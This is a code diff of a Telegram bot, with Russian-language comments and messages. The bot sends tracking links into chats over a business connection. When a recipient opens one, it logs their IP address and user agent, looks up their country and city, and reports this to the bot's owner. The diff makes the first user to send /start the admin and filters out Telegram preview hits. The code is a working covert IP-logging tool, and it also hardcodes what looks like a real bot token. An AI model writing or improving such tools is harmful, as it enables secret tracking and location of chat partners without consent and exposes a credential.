@@ -12,7 +12,7 @@ logger = logging.getLogger(__name__)
 TOKEN = os.getenv("TOKEN") or "8667896660:AAErVVlBrGLf3bG_3YMRD5ZCK9HP0Hh1GWw"
 bot = telebot.TeleBot(TOKEN)
 
-ADMIN_ID = 7226366076  # Твой ID — отчёты всегда идут сюда
+ADMIN_ID = None
 security_mode = False
 active_links = {}
 
@@ -62,11 +62,14 @@ def deactivate_link(chat_id, msg_id):
         pass
 
 def send_report(data):
+    global ADMIN_ID
+    if not ADMIN_ID: return
+
     ua = data.get("user_agent", "")
     ip = data.get("ip", "Неизвестно")
 
     if is_telegram_preview(ua):
-        return  # Пропускаем Telegram preview
+        return  # Пропускаем ложные срабатывания
 
     country, city = get_geo(ip)
 
@@ -78,14 +81,14 @@ def send_report(data):
 🏙 {city}
 🕒 {datetime.now().strftime("%H:%M:%S")}"""
 
-    try:
-        bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
-    except:
-        pass
+    bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.reply_to(message, "✅ Бот работает 24/7\n\n.q — отправить ссылку\n/time — время в ник")
+    global ADMIN_ID
+    if ADMIN_ID is None:
+        ADMIN_ID = message.from_user.id
+    bot.reply_to(message, "✅ Бот работает 24/7\n\n.q — ссылка\n/time — время")
 
 @bot.message_handler(commands=['time', 'время'])
 def time_command(message):
@@ -122,10 +125,10 @@ def process_q(chat_id, bc_id):
     link, token_id = create_webhook_link()
     if not link:
         return bot.send_message(chat_id, "❌ Ошибка", business_connection_id=bc_id)
-    
     msg = bot.send_message(chat_id, link, business_connection_id=bc_id)
-    bot.send_message(ADMIN_ID, f"✅ Ссылка отправлена в чат {chat_id}")
-    
+    global ADMIN_ID
+    if ADMIN_ID:
+        bot.send_message(ADMIN_ID, f"✅ Ссылка отправлена")
     threading.Thread(target=deactivate_link, args=(chat_id, msg.message_id), daemon=True).start()
     active_links[msg.message_id] = {"chat_id": chat_id, "token_id": token_id}
 
